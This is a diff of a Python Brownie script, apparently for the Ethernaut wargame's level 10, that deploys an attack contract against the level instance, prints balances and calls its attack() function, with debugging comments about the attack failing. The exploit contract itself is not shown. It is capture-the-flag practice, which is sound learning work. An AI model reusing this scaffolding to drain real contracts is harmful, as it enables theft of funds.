@@ -15,9 +15,9 @@ def main():
 
     # print balance
     eth_balance_instance = web3.fromWei(target.balance(), "ether")
-    print(f"Balance of ethernaut instance = {eth_balance_instance}")
+    print(f"\nBalance of ethernaut instance = {eth_balance_instance}\n")
 
-    # deploy attack contract <><><><><><><><><>
+    # deploy attack contract     <><><><><><><><><>
     attack = Attack10.deploy(ETHERNAUT_INSTANCE, AMOUNT, {"from": player})
 
     # print balance
@@ -29,12 +29,7 @@ def main():
     balance_ETHERNAUT_INSTANCE_ether = web3.fromWei(balance_ETHERNAUT_INSTANCE, "ether")
     print(f"\nBalance of Ethernaut level = {balance_ETHERNAUT_INSTANCE_ether} ETH\n")
 
-    """call the attack() function, on my attack contract"""
     print(f"\nCalling attack() from {attack}\n")
 
-    #               PROBLEM HERE - attack doesn't work!!!!!!!!!!!!!!!!!!!!!!!!!!!   <------  LOOK
-
-    attack.attack({"from": player})
-    # attack.attack({"from": player, "allow_revert": True, "gas_limit": GAS_LIMIT})
-
-    print(f"\nBalance of the attack contract = {eth_balance_attack} ether\n")
+    # HERE!!!!!
+    attack.attack({"from": player, "allow_revert": True, "gas_limit": GAS_LIMIT})
